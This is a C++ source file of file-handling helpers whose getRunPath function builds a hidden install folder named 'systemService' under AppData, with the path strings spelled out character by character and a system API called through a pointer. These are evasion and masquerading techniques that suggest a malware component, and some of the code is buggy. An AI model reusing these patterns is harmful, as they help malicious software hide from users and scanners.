#include "FileHelper.h"
#include "Public.h"
#include "api.h"


int FileHelper::fileReader(string filename, char ** lpbuf, int *bufsize) {
	int ret = 0;

	FILE * fp = fopen(filename.c_str(), "rb");
	if (fp <= 0)
	{
		int error = GetLastError();
		printf("fileReader fopen file:%s error:%u\r\n", filename.c_str(),GetLastError());
		return FALSE;
	}

	ret = fseek(fp, 0, FILE_END);

	int filesize = ftell(fp);

	ret = fseek(fp, 0, FILE_BEGIN);

	*bufsize = filesize;

	*lpbuf = new char[filesize + 0x1000];

	ret = fread(*lpbuf, 1, filesize, fp);
	fclose(fp);
	if (ret <= FALSE)
	{
		delete *lpbuf;
		return FALSE;
	}

	*(*lpbuf + filesize) = 0;
	return filesize;
}



int FileHelper::fileWriter(string filename, const char * lpdate, int datesize) {
	int ret = 0;

	FILE * fp = fopen(filename.c_str(), "ab+");
	if (fp <= 0)
	{
		printf("fileWriter fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fwrite(lpdate, 1, datesize, fp);
	fclose(fp);
	if (ret == FALSE)
	{
		return FALSE;
	}

	return datesize;
}


int FileHelper::fileWriter(string filename, const char * lpdate, int datesize, int cover) {
	int ret = 0;

	FILE * fp = 0;
	if (cover) {
		fp = fopen(filename.c_str(), "wb");
	}
	else {
		fp = fopen(filename.c_str(), "ab+");
	}

	if (fp <= 0)
	{
		printf("fileWriter fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fwrite(lpdate, 1, datesize, fp);
	fclose(fp);
	if (ret == FALSE)
	{
		return FALSE;
	}

	return datesize;
}


string FileHelper::getRunPath() {
	int ret = 0;

	string username = Public::getusername();

	char szMyPathName[] = { 's','y','s','t','e','m','S','e','r','v','i','c','e',0 };

	char szPEFilePathWin7Format[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\',
		'l','o','c','a','l','\\','%','s','\\',0 };
	char szPEFilePathWin7[MAX_PATH] = { 0 };
	wsprintfA(szPEFilePathWin7, szPEFilePathWin7Format, username.c_str(), szMyPathName);

	char szPEFilePathFormat[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'%','s','\\',0 };
	char szPEFilePath[MAX_PATH] = { 0 };
	wsprintfA(szPEFilePath, szPEFilePathFormat, username.c_str(), szMyPathName);

	char sysdir[MAX_PATH] = { 0 };
	ret = lpGetSystemDirectoryA(sysdir,MAX_PATH);
	szPEFilePathWin7[0] = sysdir[0];
	szPEFilePath[0] = sysdir[0];

	int ver = Public::getSysVer();

	string path = "";
	if (ver >= SYSTEM_VERSION_VISTA)
	{
		path = szPEFilePathWin7;
	}
	else
	{
		path = szPEFilePath;
	}

	return path;
}